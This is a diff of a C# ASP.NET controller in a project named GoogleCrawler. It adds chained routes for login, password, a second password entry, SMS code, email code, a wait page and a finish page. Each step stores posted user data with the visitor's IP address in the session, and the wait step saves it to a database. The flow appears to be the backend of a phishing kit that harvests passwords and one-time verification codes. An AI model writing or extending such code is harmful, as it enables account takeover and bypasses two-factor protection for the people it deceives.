@@ -8,7 +8,6 @@ using Microsoft.Extensions.Logging;
 using Microsoft.AspNetCore.Hosting;
 using System.Globalization;
 using Microsoft.AspNetCore.Http;
-using Microsoft.AspNetCore.Localization;
 
 namespace GoogleCrawler.Controllers
 {
@@ -25,48 +24,95 @@ namespace GoogleCrawler.Controllers
             IUsersRepository usersRepository, IUnitOfWork uow,
          IHttpContextAccessor _IHttpContextAccessor,
          IHostingEnvironment _IHostingEnvironment
-
-
             )
         {
-            _usersRepository = usersRepository;
-            _uow = uow;
-
+            this._usersRepository = usersRepository;
+            this._uow = uow;
             this._httpContextAccessor = _IHttpContextAccessor;
             this._IHostingEnvironment = _IHostingEnvironment;
-
-
         }
 
+        public Users setUsers(Users postModel)
+        {
+            postModel.ipAdress = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
+            _httpContextAccessor.HttpContext.Session.Set("postmodel", postModel);
+            ViewBag.users = postModel;
+            return postModel;
+        }
 
         public IActionResult Index()
         {
+            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
             return View();
         }
 
-        [Route("finish")]
-        public IActionResult finish()
-        {
-            var result = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
-            ViewBag.users = result;
-            _usersRepository.Add(result);
-            _uow.Commit();
-            return View();
-        }
 
         [Route("Password")]
-        public IActionResult Password()
+        public IActionResult Password(Users postModel)
+        {
+            setUsers(postModel);
+            return View();
+        }
+
+        [Route("Password2")]
+        public IActionResult Password2()
         {
             ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
+            return View();
+        }
+
+        [Route("Sms")]
+        public IActionResult Sms()
+        {
+            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
+            return View();
+        }
+
+        [Route("SmsSend")]
+        public IActionResult SmsSend(Users postModel)
+        {
+            setUsers(postModel);
+            return View();
+        }
+
+        [Route("Mail")]
+        public IActionResult Mail()
+        {
+            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
+            return View();
+        }
+
+        [Route("MailSend")]
+        public IActionResult MailSend(Users postModel)
+        {
+            setUsers(postModel);
+            return View();
+        }
+
+        [Route("Wait")]
+        public async Task<IActionResult> Wait(Users postModel)
+        {
+            setUsers(postModel);
+
+            var result = setUsers(postModel);
+            _usersRepository.Add(result);
+            var rs = await _uow.Commit();
+            return View();
+        }
+
+        [Route("Finish")]
+        public async Task<IActionResult> Finish(Users postModel)
+        {
             return View();
         }
 
         [Route("Login")]
         public IActionResult Login(Users postModel)
         {
-            _httpContextAccessor.HttpContext.Session.Set("postmodel", postModel);
-            return Json("");
+            var result = setUsers(postModel);
+            return Json(result);
         }
+
 
 
     }
